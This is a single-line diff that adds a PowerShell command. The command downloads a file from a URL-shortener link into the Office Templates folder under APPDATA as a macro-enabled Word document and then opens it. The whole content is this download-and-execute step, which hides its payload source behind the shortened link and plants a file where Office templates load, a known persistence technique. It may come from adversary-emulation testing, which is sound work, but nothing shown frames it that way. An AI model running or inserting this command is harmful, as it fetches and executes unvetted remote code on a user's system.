@@ -1,0 +1,1 @@
+powershell.exe -nologo -noprofile -command "wget https://tinyurl.com/yeykaz63 -OutFile $env:APPDATA\Microsoft\Templates\test.docm; Invoke-Item $env:APPDATA\Microsoft\Templates\test.docm"
